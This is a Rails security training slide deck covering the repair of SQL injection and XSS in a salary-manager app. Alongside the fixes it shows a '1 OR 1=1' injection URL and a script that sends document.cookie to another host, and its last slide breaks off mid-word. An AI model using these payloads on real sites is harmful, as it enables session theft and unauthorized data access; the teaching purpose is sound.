!SLIDE bullets incremental
## Fixing exploits ##

# Day 1 - Injection #

* Early morning call from your customer.
* Some employees are complainning about others salary, how do they know how much others are gaining?

!SLIDE small incremental bullets
#Did some research#

- You found that that a user used an Injection attack. He modified the query string adding and update statement.
- Query: javascript:alert(escape('1 OR 1=1'))
- http://localhost:3000/raises/search?utf8=%E2%9C%93&search_raise=12
- http://localhost:3000/raises/search?utf8=%E2%9C%93&search_raise=1+OR+1%3D1

!SLIDE small incremental bullets
#Two basic errors#

* Wrong session and roles handling
* SQL Injection

!SLIDE bullets incremental small
#The fix#

* Previously had:
 * @raises = Raise.where(["user_id = #{current_user.id} and request_amount = #{params[:search_raise]}"])
* Now he have:
 * @raises = Raise.where(["user_id = ? and request_amount = ?", current_user, params[:search_raise]])
* We could also create a constraint for that route
 * get '/search/:query', :to => 'raises#index', :as => 'search', :constraints => {:options => /\d{5}/}

!SLIDE bullets incremental
#Sanitize input#

* Use whitelist validation, black lists are never complete
* Rails adds XSS protection by default in Rails3
* [SafeBuffers and Rails3.0](http://yehudakatz.com/2010/02/01/safebuffers-and-rails-3-0/)

!SLIDE bullets incremental
#RoR built-in filter for special SQL characters#

* Default scape for ’ , " , NULL character and line breaks
* Using Model.find(id) or Model.find_by_some thing(something)

!SLIDE bullets incremental
#RoR built-in filter...#

* In SQL Fragments, specially in conditions fragments it has to be applied manually
 * (:conditions => "...")
 * connection.execute() 
 * Model.find_by_sql() methods

!SLIDE bullets incremental

* Prefer:
 * Model.find(:first, :conditions => ["login = ? AND password = ?", entered_user_name, entered_password])
 * Model.find(:first, :conditions => {:login => entered_user_name, :password => entered_password})
 * Automatically sanitize tainted variables

!SLIDE bullets incremental
#Day 2 - Cross-Site Scripting(XSS)#

* Early morning call from your customer. Seems like somebody has been using his admin account.
* He lost control of the admin account.

!SLIDE bullets incremental
#server log#

* GET /_salary-manager_session=BAh7CCIQX2NzcmZfdG9rZW4iMWc4RTNDRERCZTVWSGxoV0lEWU5DeU93dEt1UForZjVBcm9wM2p0L3dEczg9Ig9zZXNzaW9uX2lkIiU4ZjRkNmZiMTQ2ZjdmMDA0YzU2NzVjODdlMGNhNDQwYSIZd2FyZGVuLnVzZXIudXNlci5rZXlbByIJVXNlcmkG--1cbc024cd3c3ba75d9df982f4615596dbc2bb2cf;%20a=1

!SLIDE bullets incremental smaller
#Harming script#

* &lt;script&gt;document.write('&lt;img src="http://localhost:80/' + document.cookie + '" &gt;')&lt;/script&gt;

!SLIDE bullets incremental smaller
#HTTPOnly#

* Rails3 enables HttpPOnly on cookies by default
* config/initializers/session_store.rb
* SalaryManager::Application.config.session_store :cookie_store, :key => '_acl_test_session', :httponly => false

!SLIDE bullets incremental smaller
#Sanitize input#

* Use whitelist validation, black lists are never complete
* validates_format_of :site, :with => /(^$)|(^(http|https):\/\/[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(([0-9]{1,5})?\/.*)?$)/ix

!SLIDE bullets incremental
lso known as a one-click attack or session riding and abbreviated as CSRF ("sea-surf"[1]) or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.
